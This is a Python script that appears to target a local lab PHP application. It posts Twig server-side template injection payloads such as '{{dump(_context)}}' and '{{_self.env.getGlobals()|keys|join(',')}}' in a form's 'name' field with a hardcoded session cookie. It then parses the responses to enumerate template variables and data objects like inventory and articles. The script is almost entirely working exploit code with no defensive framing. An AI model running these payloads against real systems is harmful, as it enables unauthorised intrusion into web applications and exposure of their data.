import requests
import re

# Target URL and session cookie
target_url = "http://127.0.0.1:8080/index.php"
session_cookie = "adf118a2717e83ee6455ea878ebb507e"

# Twig-specific SSTI payloads for data source enumeration
payloads = [
    "{{dump(_context)}}",
    "{{_context|keys|join(',')}}",
    "{{_self|keys|join(',')}}",
    "{{_self.env.getGlobals()|keys|join(',')}}",
    "{{app|default('NOT_FOUND')}}",
    "{{request|default('NOT_FOUND')}}",
    "{{inventory|default('NOT_FOUND')}}",
    "{{articles|default('NOT_FOUND')}}",
    "{{config|default('NOT_FOUND')}}",
    "{{entity|default('NOT_FOUND')}}"
]

# Keywords to identify inventory/article related data
keywords = ['inventory', 'article', 'post', 'product', 'item', 'entity', 'model', 'db', 'database']

session = requests.Session()
session.cookies.set('PHPSESSID', session_cookie)

print(f"Target: {target_url}")
print("=" * 80)

for payload in payloads:
    print(f"\n[PAYLOAD] {payload}")
    try:
        response = session.post(target_url, data={'name': payload})
        print(f"Status: {response.status_code}")
        
        # Extract just the name part from response
        name_match = re.search(r'<strong>(.*?)</strong>', response.text)
        if name_match:
            result = name_match.group(1)
            print(f"Result: {result}")
            
            # Check for keywords
            found = []
            for kw in keywords:
                if kw.lower() in result.lower():
                    found.append(kw)
            if found:
                print(f"[!] KEYWORDS: {', '.join(found)}")
        else:
            print("No name in response")
            if "Fatal error" in response.text:
                print("ERROR DETECTED (may indicate vulnerability)")
                
    except Exception as e:
        print(f"Error: {e}")
